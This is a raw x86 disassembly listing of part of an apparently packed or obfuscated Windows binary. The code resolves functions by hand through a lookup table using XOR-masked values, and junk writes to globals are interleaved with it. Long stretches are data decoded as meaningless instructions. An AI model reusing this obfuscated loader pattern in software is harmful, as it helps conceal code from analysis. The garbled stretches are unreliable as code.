  421ae4:	and    DWORD PTR [ebp-0x4139a558],esp
  421aea:	aam    0xf
  421aec:	or     al,0xd2
  421aee:	push   ecx
  421aef:	push   es
  421af0:	je     0x421b0a
  421af2:	outs   dx,DWORD PTR ds:[esi]
  421af3:	sub    DWORD PTR [ebx+0x26],eax
  421af6:	adc    BYTE PTR [ebx+edx*8],0x4a
  421afa:	xor    al,0x94
  421afc:	sbb    eax,0xe345c1ce
  421b01:	inc    esi
  421b02:	pushf  
  421b03:	stos   DWORD PTR es:[edi],eax
  421b04:	fwait
  421b05:	mov    eax,0xa216820d
  421b0a:	jmp    0x4ee289f4
  421b0f:	int3   
  421b10:	xor    al,0xbf
  421b12:	mov    ds:0xf5308553,eax
  421b17:	cmp    dh,al
  421b19:	jae    0x421b62
  421b1b:	add    eax,0xe612ca11
  421b20:	pop    edx
  421b21:	sbb    ebp,DWORD PTR [edi+0x4726f61c]
  421b27:	cli    
  421b28:	push   esp
  421b29:	iret   
  421b2a:	inc    eax
  421b2b:	adc    DWORD PTR [edi+ebx*1+0x39d5eaf9],ecx
  421b32:	xchg   edx,eax
  421b33:	and    al,0x71
  421b35:	mov    eax,0xee7df14d
  421b3a:	lods   al,BYTE PTR ds:[esi]
  421b3b:	pop    edi
  421b3c:	into   
  421b3d:	inc    edx
  421b3e:	and    BYTE PTR [edx+ebp*8],cl
  421b41:	add    ah,BYTE PTR [edx*1-0x11cb3b89]
  421b48:	leave  
  421b49:	dec    esi
  421b4a:	shl    BYTE PTR [edi-0x6e],1
  421b4d:	int    0x52
  421b4f:	xchg   edx,eax
  421b50:	adc    al,al
  421b52:	popa   
  421b53:	xor    cl,BYTE PTR [eax+0x40]
  421b56:	or     DWORD PTR [ebx-0x3e],esp
  421b59:	inc    edx
  421b5a:	push   ecx
  421b5b:	aaa    
  421b5c:	not    DWORD PTR [eax]
  421b5e:	int    0x8b
  421b60:	shr    ecx,0xbb
  421b63:	in     al,0xfa
  421b65:	hlt    
  421b66:	sub    BYTE PTR [edi+0x20],ch
  421b69:	mov    al,dh
  421b6b:	mov    dl,0x1a
  421b6d:	cdq    
  421b6e:	das    
  421b6f:	jno    0x421bde
  421b71:	xor    al,0x97
  421b73:	and    eax,0xb87564de
  421b78:	add    DWORD PTR [eax],edi
  421b7a:	xchg   ebx,eax
  421b7b:	fist   WORD PTR [edx]
  421b7d:	scas   al,BYTE PTR es:[edi]
  421b7e:	mov    dl,0x38
  421b80:	cld    
  421b81:	jecxz  0x421b8e
  421b83:	aad    0x37
  421b85:	outs   dx,DWORD PTR ds:[esi]
  421b86:	in     al,0x3c
  421b88:	mov    ecx,0xdb244a
  421b8d:	cmp    BYTE PTR ds:0xc2acee3a,bl
  421b93:	sahf   
  421b94:	je     0x421c02
  421b96:	call   0x6be7:0x8168615a
  421b9d:	mov    esp,0x2b5741d3
  421ba2:	int    0x74
  421ba4:	dec    eax
  421ba5:	adc    cl,0x9b
  421ba8:	data16 sti 
  421baa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bab:	jl     0x421b8d
  421bad:	out    dx,al
  421bae:	pusha  
  421baf:	pop    esi
  421bb0:	int    0xa2
  421bb2:	cmp    DWORD PTR [ecx],0x3ab23811
  421bb8:	das    
  421bb9:	pop    eax
  421bba:	sub    al,0xc0
  421bbc:	das    
  421bbd:	mov    eax,0xd78466e0
  421bc2:	push   ebp
  421bc3:	outs   dx,DWORD PTR ds:[esi]
  421bc4:	pop    ds
  421bc5:	mov    ah,0x9
  421bc7:	sub    dl,BYTE PTR [ecx-0x48]
  421bca:	test   eax,0xd03d8d2a
  421bcf:	pop    ebp
  421bd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bd1:	faddp  st(0),st
  421bd3:	sub    edx,edx
  421bd5:	pinsrw mm1,eax,0xe9
  421bd9:	dec    edx
  421bda:	push   cs
  421bdb:	in     al,dx
  421bdc:	dec    esi
  421bdd:	lea    edi,[ebx-0x2b]
  421be0:	not    bl
  421be2:	(bad)  
  421be3:	fnstcw WORD PTR [esi+0x2456eee2]
  421be9:	neg    BYTE PTR [edi]
  421beb:	or     eax,0xac994d6f
  421bf0:	adc    eax,0x7cbb64ac
  421bf5:	sar    DWORD PTR [edi+0x5c],1
  421bf8:	jno    0x421c76
  421bfa:	inc    edi
  421bfb:	jg     0x421c2d
  421bfd:	lods   eax,DWORD PTR ds:[esi]
  421bfe:	mov    WORD PTR [ebx-0x24ee2e2d],gs
  421c04:	mov    edx,DWORD PTR [esi]
  421c06:	mov    dh,0x2c
  421c08:	sbb    al,0x48
  421c0a:	clc    
  421c0b:	and    BYTE PTR [eax],0x19
  421c0e:	sbb    al,ch
  421c10:	jb     0x421c19
  421c12:	adc    bh,BYTE PTR [esi-0x5799b640]
  421c18:	inc    esp
  421c19:	sbb    esi,ebx
  421c1b:	jmp    0x77f9:0x8f2be16a
  421c22:	mov    bh,0xa1
  421c24:	(bad)  
  421c25:	stos   DWORD PTR es:[edi],eax
  421c26:	ins    BYTE PTR es:[edi],dx
  421c27:	add    ebx,DWORD PTR [esi]
  421c29:	xchg   DWORD PTR [esi+0x3f8207f5],edi
  421c2f:	xlat   BYTE PTR ds:[ebx]
  421c30:	sub    BYTE PTR [edx-0x25],dl
  421c33:	xor    DWORD PTR [ecx+edi*1],ecx
  421c36:	loopne 0x421bbe
  421c38:	retf   
  421c39:	lea    esp,[eax+0x7b]
  421c3c:	push   edx
  421c3d:	dec    esi
  421c3e:	sub    edx,edx
  421c40:	popf   
  421c41:	lea    esi,[eax]
  421c43:	aaa    
  421c44:	mov    al,ds:0xec5e6371
  421c49:	leave  
  421c4a:	dec    ecx
  421c4b:	leave  
  421c4c:	mov    ah,0xb5
  421c4e:	mov    BYTE PTR [eax-0x43],al
  421c51:	cwde   
  421c52:	xlat   BYTE PTR ds:[ebx]
  421c53:	imul   edx,edi,0xf4740fef
  421c59:	jnp    0x421c1b
  421c5b:	sbb    al,0x18
  421c5d:	out    0xdf,eax
  421c5f:	cs stos BYTE PTR es:[edi],al
  421c61:	jp     0x421c77
  421c63:	icebp  
  421c64:	ficomp WORD PTR [edi+0x6224f585]
  421c6a:	inc    esi
  421c6b:	imul   dl
  421c6d:	pop    eax
  421c6e:	test   BYTE PTR [ebp+0x31],cl
  421c71:	pop    edx
  421c72:	les    ecx,FWORD PTR [ebx+0x31d7c3b7]
  421c78:	and    BYTE PTR [eax+0x66],0x3f
  421c7c:	sub    al,0xb3
  421c7e:	rcl    BYTE PTR [edi+0x62],cl
  421c81:	mov    ebp,0x5612eb29
  421c86:	(bad)  
  421c87:	icebp  
  421c88:	adc    edx,DWORD PTR [ebx]
  421c8a:	mov    ebp,0x467abdc9
  421c8f:	inc    ecx
  421c90:	aad    0xae
  421c92:	sar    BYTE PTR [ecx+esi*8-0x1f00d147],1
  421c99:	retf   0xe3bc
  421c9c:	xor    DWORD PTR [eax+0x32],0x1e
  421ca0:	and    BYTE PTR [ebx+edx*1+0x8b503b7],cl
  421ca7:	(bad)  
  421ca8:	(bad)  
  421ca9:	dec    DWORD PTR [ecx-0x1f74b]
  421caf:	dec    DWORD PTR [ebx-0x1e77b]
  421cb5:	(bad)  
  421cb6:	cmp    DWORD PTR [ebp-0x1f8],eax
  421cbc:	je     0x421e2b
  421cc2:	mov    eax,DWORD PTR [ebp-0x1f8]
  421cc8:	mov    ecx,DWORD PTR [ebp-0x20c]
  421cce:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421cd3:	xor    eax,0xa59b
  421cd8:	movzx  eax,ax
  421cdb:	sar    eax,1
  421cdd:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421ce3:	mov    edx,DWORD PTR [ebp-0x20c]
  421ce9:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421cee:	xor    ecx,0xa59b
  421cf4:	movzx  ecx,cx
  421cf7:	shl    ecx,0xf
  421cfa:	or     eax,ecx
  421cfc:	movzx  eax,ax
  421cff:	mov    DWORD PTR [ebp-0x1fc],eax
  421d05:	jmp    0x421de1
  421d0a:	jg     0x421cee
  421d0c:	sbb    BYTE PTR [edx-0x144c4344],ch
  421d12:	outs   dx,BYTE PTR ds:[esi]
  421d13:	mov    esp,0xe4a90cd
  421d18:	test   al,0xe3
  421d1a:	cmp    cl,cl
  421d1c:	sar    BYTE PTR [esi-0x414141cc],0x26
  421d23:	xor    eax,0xe959925e
  421d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d29:	retf   0x28dd
  421d2c:	mov    cs,ebp
  421d2e:	mov    cl,0x84
  421d30:	test   DWORD PTR [esi-0xb],eax
  421d33:	scas   al,BYTE PTR es:[edi]
  421d34:	dec    ebx
  421d35:	test   BYTE PTR [ebx+0x4b],al
  421d38:	adc    eax,ecx
  421d3a:	lahf   
  421d3b:	ret    0xa1ba
  421d3e:	(bad)
  421d43:	gs je  0x421d77
  421d46:	jb     0x421dba
  421d48:	addr16 in eax,0xa5
  421d4b:	loopne 0x421d9e
  421d4d:	ret    0xb741
  421d50:	mov    al,ds:0x56d978e9
  421d55:	and    al,0x5b
  421d57:	sbb    DWORD PTR [edx],esp
  421d59:	and    al,0x9
  421d5b:	cmp    al,0x97
  421d5d:	loope  0x421d0a
  421d5f:	out    0x5c,eax
  421d61:	(bad)  [edi-0x75]
  421d64:	in     al,dx
  421d65:	add    esi,DWORD PTR [esi]
  421d67:	jns    0x421d07
  421d69:	ja     0x421d10
  421d6b:	test   al,0xb6
  421d6d:	mul    eax
  421d6f:	lds    ebp,FWORD PTR [edi+0x3dd5ab31]
  421d75:	imul   ebx,edi,0x7b
  421d78:	cld    
  421d79:	cmp    cl,BYTE PTR [esi+edi*8-0x11aca7bd]
  421d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d81:	mov    es,edx
  421d83:	icebp  
  421d84:	xchg   ebp,eax
  421d85:	(bad)  
  421d86:	push   esi
  421d87:	int    0xe1
  421d89:	and    al,0x7b
  421d8b:	mov    esp,0x158f1c9f
  421d90:	(bad)  
  421d91:	push   ds
  421d92:	jnp    0x421d48
  421d94:	xor    esp,edx
  421d96:	js     0x421d22
  421d98:	out    0x49,al
  421d9a:	shl    BYTE PTR [edi],0x94
  421d9d:	rol    cl,cl
  421d9f:	mov    dl,0x4b
  421da1:	sbb    al,BYTE PTR [eax+0x7eee35f]
  421da7:	or     ecx,ecx
  421da9:	inc    esp
  421daa:	pushf  
  421dab:	xchg   esi,esi
  421dad:	outs   dx,BYTE PTR ds:[esi]
  421dae:	(bad)  
  421daf:	mov    cl,BYTE PTR [ebx+0x78]
  421db2:	mov    eax,0xfaf7239d
  421db7:	fdivr  DWORD PTR [ecx-0x20]
  421dba:	pop    ecx
  421dbb:	(bad)  [edi-0x415e47d8]
  421dc1:	push   eax
  421dc2:	inc    edi
  421dc3:	mov    ecx,0x88e08709
  421dc8:	xor    DWORD PTR [edi+eiz*8],edx
  421dcb:	jo     0x421dcc
  421dcd:	pop    esp
  421dce:	xor    al,0xc3
  421dd1:	mov    ah,0x90
  421dd3:	ins    BYTE PTR es:[edi],dx
  421dd4:	jg     0x421e1f
  421dd6:	sahf   
  421dd7:	mov    es,WORD PTR [ecx+0x38]
  421dda:	pop    edi
  421ddb:	fidiv  WORD PTR [ebx-0x41befe96]
  421de1:	mov    eax,DWORD PTR [ebp-0x1f8]
  421de7:	mov    ecx,DWORD PTR [ebp-0x20c]
  421ded:	movzx  eax,WORD PTR [ecx+eax*4]
  421df1:	xor    eax,0xa59b
  421df6:	movzx  eax,ax
  421df9:	sar    eax,1
  421dfb:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421e01:	mov    edx,DWORD PTR [ebp-0x20c]
  421e07:	movzx  ecx,WORD PTR [edx+ecx*4]
  421e0b:	xor    ecx,0xa59b
  421e11:	movzx  ecx,cx
  421e14:	shl    ecx,0xf
  421e17:	or     eax,ecx
  421e19:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421e1f:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421e26:	jmp    0x421879
  421e2b:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e31:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e37:	xor    eax,0xcb79b576
  421e3c:	xor    edx,0x9c2b8ae8
  421e42:	mov    cl,0x2
  421e44:	call   0x408bb8
  421e49:	mov    esi,eax
  421e4b:	mov    edi,edx
  421e4d:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e53:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e59:	xor    eax,0xcb79b576
  421e5e:	xor    edx,0x9c2b8ae8
  421e64:	mov    cl,0x3e
  421e66:	call   0x4223fa
  421e6b:	or     esi,eax
  421e6d:	or     edi,edx
  421e6f:	mov    DWORD PTR [ebp-0x1e4],esi
  421e75:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e7b:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e81:	xor    eax,0xcb79b576
  421e86:	xor    edx,0x9c2b8ae8
  421e8c:	mov    cl,0x2
  421e8e:	call   0x408bb8
  421e93:	mov    esi,eax
  421e95:	mov    edi,edx
  421e97:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e9d:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ea3:	xor    eax,0xcb79b576
  421ea8:	xor    edx,0x9c2b8ae8
  421eae:	mov    cl,0x3e
  421eb0:	call   0x4223fa
  421eb5:	or     esi,eax
  421eb7:	or     edi,edx
  421eb9:	mov    DWORD PTR [ebp-0x23c],esi
  421ebf:	mov    DWORD PTR [ebp-0x238],edi
  421ec5:	mov    eax,DWORD PTR [ebp-0x23c]
  421ecb:	or     eax,DWORD PTR [ebp-0x238]
  421ed1:	je     0x422131
  421ed7:	lea    eax,[ebp-0x204]
  421edd:	mov    DWORD PTR [ebp-0x208],eax
  421ee3:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ee9:	xor    edx,edx
  421eeb:	mov    cl,0x2
  421eed:	call   0x4223fa
  421ef2:	mov    esi,eax
  421ef4:	mov    edi,edx
  421ef6:	mov    eax,DWORD PTR [ebp-0x1e4]
  421efc:	xor    edx,edx
  421efe:	mov    cl,0x3e
  421f00:	call   0x408bb8
  421f05:	or     esi,eax
  421f07:	or     edi,edx
  421f09:	xor    esi,0xcb79b576
  421f0f:	xor    edi,0x9c2b8ae8
  421f15:	mov    eax,DWORD PTR [ebp-0x208]
  421f1b:	mov    DWORD PTR [eax],esi
  421f1d:	mov    DWORD PTR [eax+0x4],edi
  421f20:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f26:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421f2e:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f34:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f3a:	xor    eax,0xcb79b576
  421f3f:	xor    edx,0x9c2b8ae8
  421f45:	mov    cl,0x2
  421f47:	call   0x408bb8
  421f4c:	mov    ebx,eax
  421f4e:	mov    edi,edx
  421f50:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f56:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f5c:	xor    eax,0xcb79b576
  421f61:	xor    edx,0x9c2b8ae8
  421f67:	mov    cl,0x3e
  421f69:	call   0x4223fa
  421f6e:	or     ebx,eax
  421f70:	or     edi,edx
  421f72:	movsx  eax,bl
  421f75:	cmp    esi,eax
  421f77:	je     0x4220d7
  421f7d:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f83:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421f8b:	mov    eax,DWORD PTR [ebp-0x204]
  421f91:	mov    edx,DWORD PTR [ebp-0x200]
  421f97:	xor    eax,0xcb79b576
  421f9c:	xor    edx,0x9c2b8ae8
  421fa2:	mov    cl,0x2
  421fa4:	call   0x408bb8
  421fa9:	mov    edi,eax
  421fab:	mov    ebx,edx
  421fad:	mov    eax,DWORD PTR [ebp-0x204]
  421fb3:	mov    edx,DWORD PTR [ebp-0x200]
  421fb9:	xor    eax,0xcb79b576
  421fbe:	xor    edx,0x9c2b8ae8
  421fc4:	mov    cl,0x3e
  421fc6:	call   0x4223fa
  421fcb:	or     edi,eax
  421fcd:	or     ebx,edx
  421fcf:	mov    eax,DWORD PTR [ebp-0x210]
  421fd5:	movsx  eax,BYTE PTR [eax+edi*1]
  421fd9:	cmp    esi,eax
  421fdb:	je     0x421feb
  421fe1:	jmp    0x422131
  421fe6:	jmp    0x4220d7
  421feb:	mov    eax,DWORD PTR [ebp-0x204]
  421ff1:	mov    edx,DWORD PTR [ebp-0x200]
  421ff7:	xor    eax,0xcb79b576
  421ffc:	xor    edx,0x9c2b8ae8
  422002:	mov    cl,0x2
  422004:	call   0x408bb8
  422009:	mov    esi,eax
  42200b:	mov    edi,edx
  42200d:	mov    eax,DWORD PTR [ebp-0x204]
  422013:	mov    edx,DWORD PTR [ebp-0x200]
  422019:	xor    eax,0xcb79b576
  42201e:	xor    edx,0x9c2b8ae8
  422024:	mov    cl,0x3e
  422026:	call   0x4223fa
  42202b:	or     esi,eax
  42202d:	or     edi,edx
  42202f:	mov    eax,DWORD PTR [ebp-0x210]
  422035:	movsx  esi,BYTE PTR [eax+esi*1]
  422039:	mov    eax,DWORD PTR [ebp-0x1f0]
  42203f:	mov    edx,DWORD PTR [ebp-0x1ec]
  422045:	xor    eax,0xcb79b576
  42204a:	xor    edx,0x9c2b8ae8
  422050:	mov    cl,0x2
  422052:	call   0x408bb8
  422057:	mov    ebx,eax
  422059:	mov    edi,edx
  42205b:	mov    eax,DWORD PTR [ebp-0x1f0]
  422061:	mov    edx,DWORD PTR [ebp-0x1ec]
  422067:	xor    eax,0xcb79b576
  42206c:	xor    edx,0x9c2b8ae8
  422072:	mov    cl,0x3e
  422074:	call   0x4223fa
  422079:	or     ebx,eax
  42207b:	or     edi,edx
  42207d:	movsx  eax,bl
  422080:	cmp    esi,eax
  422082:	jne    0x4220d7
  422088:	mov    eax,DWORD PTR [ebp-0x1e0]
  42208e:	mov    edx,DWORD PTR [ebp-0x1dc]
  422094:	xor    eax,0xcb79b576
  422099:	xor    edx,0x9c2b8ae8
  42209f:	mov    cl,0x2
  4220a1:	call   0x408bb8
  4220a6:	mov    esi,eax
  4220a8:	mov    edi,edx
  4220aa:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220b0:	mov    edx,DWORD PTR [ebp-0x1dc]
  4220b6:	xor    eax,0xcb79b576
  4220bb:	xor    edx,0x9c2b8ae8
  4220c1:	mov    cl,0x3e
  4220c3:	call   0x4223fa
  4220c8:	or     esi,eax
  4220ca:	or     edi,edx
  4220cc:	mov    DWORD PTR [ebp-0x214],esi
  4220d2:	jmp    0x42217b
  4220d7:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220dd:	mov    edx,DWORD PTR [ebp-0x1dc]
  4220e3:	xor    eax,0xcb79b576
  4220e8:	xor    edx,0x9c2b8ae8
  4220ee:	mov    cl,0x2
  4220f0:	call   0x408bb8
  4220f5:	mov    esi,eax
  4220f7:	mov    edi,edx
  4220f9:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220ff:	mov    edx,DWORD PTR [ebp-0x1dc]
  422105:	xor    eax,0xcb79b576
  42210a:	xor    edx,0x9c2b8ae8
  422110:	mov    cl,0x3e
  422112:	call   0x4223fa
  422117:	or     esi,eax
  422119:	or     edi,edx
  42211b:	add    esi,DWORD PTR [ebp-0x1e4]
  422121:	mov    DWORD PTR [ebp-0x1e4],esi
  422127:	jmp    0x421e75
  42212c:	jmp    0x421e75
  422131:	mov    eax,DWORD PTR [ebp-0x1f0]
  422137:	mov    edx,DWORD PTR [ebp-0x1ec]
  42213d:	xor    eax,0xcb79b576
  422142:	xor    edx,0x9c2b8ae8
  422148:	mov    cl,0x2
  42214a:	call   0x408bb8
  42214f:	mov    esi,eax
  422151:	mov    edi,edx
  422153:	mov    eax,DWORD PTR [ebp-0x1f0]
  422159:	mov    edx,DWORD PTR [ebp-0x1ec]
  42215f:	xor    eax,0xcb79b576
  422164:	xor    edx,0x9c2b8ae8
  42216a:	mov    cl,0x3e
  42216c:	call   0x4223fa
  422171:	or     esi,eax
  422173:	or     edi,edx
  422175:	mov    DWORD PTR [ebp-0x214],esi
  42217b:	mov    eax,DWORD PTR [ebp-0x214]
  422181:	mov    DWORD PTR [ebp-0xc8],eax
  422187:	cmp    DWORD PTR [ebp-0xc8],0x0
  42218e:	je     0x4221b8
  422194:	mov    eax,DWORD PTR [ebp-0x144]
  42219a:	mov    ecx,DWORD PTR [ebp-0xac]
  4221a0:	movzx  eax,WORD PTR [ecx+eax*2]
  4221a4:	mov    ecx,DWORD PTR [ebp-0xa8]
  4221aa:	mov    eax,DWORD PTR [ecx+eax*4]
  4221ad:	mov    DWORD PTR [ebp-0xfc],eax
  4221b3:	jmp    0x4221bd
  4221b8:	jmp    0x420789
  4221bd:	cmp    DWORD PTR [ebp-0xfc],0x0
  4221c4:	jne    0x4221d1
  4221ca:	xor    eax,eax
  4221cc:	jmp    0x4223f3
  4221d1:	mov    eax,DWORD PTR [ebp+0x8]
  4221d4:	add    eax,DWORD PTR [ebp-0xfc]
  4221da:	mov    DWORD PTR [ebp-0xec],eax
  4221e0:	mov    DWORD PTR [ebp-0x74],0x0
  4221e7:	cmp    DWORD PTR [ebp-0xb0],0x0
  4221ee:	je     0x42226a
  4221f4:	cmp    DWORD PTR [ebp-0xb0],0x0
  4221fb:	je     0x42226a
  422201:	mov    eax,DWORD PTR [ebp-0xb0]
  422207:	shl    eax,0x2
  42220a:	mov    DWORD PTR [ebp-0x74],eax
  42220d:	mov    DWORD PTR [ebp-0x14c],0x0
  422217:	sub    esp,DWORD PTR [ebp-0x74]
  42221a:	mov    DWORD PTR [ebp-0x14c],esp
  422220:	mov    DWORD PTR [ebp-0x148],0x0
  42222a:	mov    eax,DWORD PTR [ebp-0x148]
  422230:	cmp    eax,DWORD PTR [ebp-0xb0]
  422236:	je     0x42226a
  42223c:	mov    eax,DWORD PTR [ebp-0x148]
  422242:	mov    ecx,DWORD PTR [ebp-0x14c]
  422248:	mov    edx,DWORD PTR [ebp-0x148]
  42224e:	mov    esi,DWORD PTR [ebp+0x14]
  422251:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422255:	mov    DWORD PTR [ecx+eax*4],edx
  422258:	mov    eax,DWORD PTR [ebp-0x148]
  42225e:	inc    eax
  42225f:	mov    DWORD PTR [ebp-0x148],eax
  422265:	jmp    0x42222a
  42226a:	mov    DWORD PTR [ebp-0x9c],0x0
  422274:	push   0x4223ac
  422279:	jmp    DWORD PTR [ebp-0xec]
  42227f:	mov    eax,eax
  422281:	mov    ecx,esp
  422283:	ret    0x8
  422286:	cmp    DWORD PTR ds:0x428405,0x0
  42228d:	not    DWORD PTR ds:0x428405
  422293:	mov    DWORD PTR ds:0x42841d,0x5307
  42229d:	mov    DWORD PTR ds:0x428575,0x4819
  4222a7:	jmp    0x4222e9
  4222ac:	not    eax
  4222ae:	cmp    DWORD PTR ds:0x428405,0x0
  4222b5:	jl     0x4222d7
  4222bb:	push   0x0
  4222bd:	call   DWORD PTR ds:0x42e13c
  4222c3:	add    DWORD PTR ds:0x4284f5,0x4c21
  4222cd:	and    DWORD PTR ds:0x4284dd,0x73e0
  4222d7:	sub    DWORD PTR ds:0x428449,edx
  4222dd:	or     DWORD PTR ds:0x428351,ecx
  4222e3:	sub    DWORD PTR ds:0x4284ed,ebx
  4222e9:	push   ebx
  4222ea:	dec    eax
  4222eb:	push   esi
  4222ec:	mov    eax,DWORD PTR [esp+0x18]
  4222f0:	or     eax,eax
  4222f2:	mov    DWORD PTR ds:0x42840d,0x72ef
  4222fc:	jne    0x422338
  422302:	mov    ecx,DWORD PTR [esp+0x14]
  422306:	mov    eax,DWORD PTR [esp+0x10]
  42230a:	xor    edx,edx
  42230c:	inc    ebx
  42230d:	div    ecx
  42230f:	sbb    ebx,DWORD PTR ds:0x428559
  422315:	mov    ebx,eax
  422317:	mov    eax,DWORD PTR [esp+0xc]
  42231b:	adc    DWORD PTR ds:0x4284dd,0x42846d
  422325:	div    ecx
  422327:	mov    DWORD PTR ds:0x428405,0x3a7e
  422331:	mov    edx,ebx
  422333:	jmp    0x4223a7
  422338:	mov    ecx,eax
  42233a:	mov    ebx,DWORD PTR [esp+0x14]
  42233e:	xor    eax,DWORD PTR ds:0x428579
  422344:	mov    edx,DWORD PTR [esp+0x10]
  422348:	mov    eax,DWORD PTR [esp+0xc]
  42234c:	mov    DWORD PTR ds:0x428475,0x7dde
  422356:	shr    ecx,1
  422358:	mov    DWORD PTR ds:0x428565,0x121c
  422362:	rcr    ebx,1
  422364:	shr    edx,1
  422366:	rcr    eax,1
  422368:	or     ecx,ecx
  42236a:	jne    0x42234c
  422370:	div    ebx
  422372:	mov    esi,eax
  422374:	mul    DWORD PTR [esp+0x18]
  422378:	mov    ecx,eax
  42237a:	mov    eax,DWORD PTR [esp+0x14]
  42237e:	mul    esi
  422380:	add    edx,ecx
  422382:	jb     0x4223a2
  422388:	cmp    edx,DWORD PTR [esp+0x10]
  42238c:	ja     0x4223a2
  422392:	jb     0x4223a3
  422398:	cmp    eax,DWORD PTR [esp+0xc]
  42239c:	jbe    0x4223a3
  4223a2:	dec    esi
  4223a3:	xor    edx,edx
  4223a5:	mov    eax,esi
  4223a7:	pop    esi
  4223a8:	pop    ebx
  4223a9:	ret    0x10
  4223ac:	sub    DWORD PTR [ebp+0x10],0x1
  4223b0:	mov    DWORD PTR ds:0x4284e1,0x3767
  4223ba:	cmp    DWORD PTR [ebp+0x10],0x0
  4223be:	mov    DWORD PTR ds:0x428569,0xcef
  4223c8:	je     0x4223dd
  4223ce:	mov    esi,DWORD PTR ds:0x4284f9
  4223d4:	sbb    DWORD PTR ds:0x428565,esi
  4223da:	add    esp,DWORD PTR [ebp-0x74]
  4223dd:	mov    DWORD PTR [ebp-0x9c],eax
  4223e3:	mov    eax,DWORD PTR [ebp-0x9c]
  4223e9:	mov    DWORD PTR ds:0x428431,0x5e8f
  4223f3:	pop    edi
  4223f4:	pop    esi
  4223f5:	pop    ebx
  4223f6:	leave  
  4223f7:	ret    0x10
  4223fa:	cmp    cl,0x40
  4223fd:	mov    DWORD PTR ds:0x428435,0x7c93
  422407:	jae    0x422447
  42240d:	cmp    cl,0x20
  422410:	mov    DWORD PTR ds:0x428371,0x440e
  42241a:	jae    0x422426
  422420:	shld   edx,eax,cl
  422423:	shl    eax,cl
  422425:	ret    
  422426:	movzx  edx,WORD PTR ds:0x4284c5
  42242d:	add    DWORD PTR ds:0x428475,edx
  422433:	mov    edx,eax
  422435:	xor    eax,eax
  422437:	mov    DWORD PTR ds:0x428361,0x5f4f
  422441:	and    cl,0x1f
  422444:	shl    edx,cl
  422446:	ret    
  422447:	xor    eax,eax
  422449:	xor    edx,edx
  42244b:	ret    
  42244c:	add    BYTE PTR [eax],al
  42244e:	add    BYTE PTR [eax],al
  422450:	add    al,0x73
  422452:	xchg   ecx,ebp
  422454:	push   ebx
  422455:	into   
  422456:	jns    0x4224b9
  422458:	push   0x98626f72
  42245d:	xor    eax,0x74b9d761
  422462:	jne    0x4224d2
  422464:	and    dl,bl
  422466:	mov    ch,0xed
  422468:	popf   
  422469:	bnd ret 0xa4
  42246d:	add    BYTE PTR [eax],al
  42246f:	add    BYTE PTR [edi+0x72],ah
  422472:	gs popa 
  422474:	je     0x4224dd
  422476:	jb     0x4224dd
  422478:	popa   
  422479:	je     0x4224e2
  42247b:	jb     0x4224e2
  42247d:	popa   
  42247e:	je     0x4224e7
  422480:	jb     0x4224e7
  422482:	popa   
  422483:	je     0x4224ec
  422485:	jb     0x4224ec
  422487:	popa   
  422488:	je     0x4224f1
  42248a:	jb     0x4224f1
  42248c:	popa   
  42248d:	je     0x4224f6
  42248f:	jb     0x4224f6
  422491:	popa   
  422492:	je     0x4224fb
  422494:	jb     0x4224fb
  422496:	popa   
  422497:	je     0x422500
  422499:	jb     0x422500
  42249b:	popa   
  42249c:	je     0x422505
  42249e:	jb     0x422505
  4224a0:	popa   
  4224a1:	je     0x4224a3
  4224a3:	add    BYTE PTR [eax+0x65],ch
  4224a6:	ins    BYTE PTR es:[edi],dx
  4224a7:	ins    BYTE PTR es:[edi],dx
  4224a8:	push   0x686c6c65
  4224ad:	gs ins BYTE PTR es:[edi],dx
  4224af:	ins    BYTE PTR es:[edi],dx
  4224b0:	push   0x686c6c65
  4224b5:	gs ins BYTE PTR es:[edi],dx
  4224b7:	ins    BYTE PTR es:[edi],dx
  4224b8:	push   0x686c6c65
  4224bd:	gs ins BYTE PTR es:[edi],dx
  4224bf:	ins    BYTE PTR es:[edi],dx
  4224c0:	push   0x686c6c65
  4224c5:	gs ins BYTE PTR es:[edi],dx
  4224c7:	ins    BYTE PTR es:[edi],dx
  4224c8:	push   0x686c6c65
  4224cd:	gs ins BYTE PTR es:[edi],dx
  4224cf:	ins    BYTE PTR es:[edi],dx
  4224d0:	push   0x686c6c65
  4224d5:	gs ins BYTE PTR es:[edi],dx
  4224d7:	ins    BYTE PTR es:[edi],dx
  4224d8:	add    BYTE PTR [eax],al
  4224da:	add    BYTE PTR [eax],al
  4224dc:	outs   dx,DWORD PTR ds:[esi]
  4224dd:	add    BYTE PTR [eax+eax*1+0x65],ch
  4224e1:	add    BYTE PTR [ecx+0x0],ah
  4224e4:	jne    0x4224e6
  4224e6:	je     0x4224e8
  4224e8:	xor    eax,DWORD PTR [eax]
  4224ea:	xor    al,BYTE PTR [eax]
  4224ec:	add    BYTE PTR [eax],al
  4224ee:	add    BYTE PTR [eax],al
  4224f0:	push   0x61006500
  4224f5:	add    BYTE PTR [esi+0x0],dh
